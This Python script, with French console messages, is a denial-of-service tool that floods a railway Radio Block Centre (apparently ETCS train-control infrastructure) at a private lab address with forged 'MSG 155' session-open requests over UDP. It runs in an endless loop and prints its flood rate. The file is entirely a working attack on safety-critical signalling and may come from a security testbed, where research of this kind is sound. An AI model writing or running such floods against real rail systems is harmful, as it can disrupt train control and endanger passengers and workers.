import socket
import json
import time

RBC_HOST = "192.168.70.129"
RBC_PORT = 5000

print("[ATTACK DOS] Démarrage du flood RBC avec faux MSG 155...")
print("[ATTACK DOS] Le RBC va être submergé de demandes de session")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

count = 0
start = time.time()

while True:
    fake_msg155 = {
        "type": "155",
        "train_id": f"FAKE_TRAIN_{count}",
        "t_train": int(time.time())
    }
    sock.sendto(json.dumps(fake_msg155).encode(), (RBC_HOST, RBC_PORT))
    count += 1

    if count % 1000 == 0:
        elapsed = time.time() - start
        print(f"[ATTACK DOS] {count} fausses sessions ouvertes en {elapsed:.1f}s — {count/elapsed:.0f} msg/s")
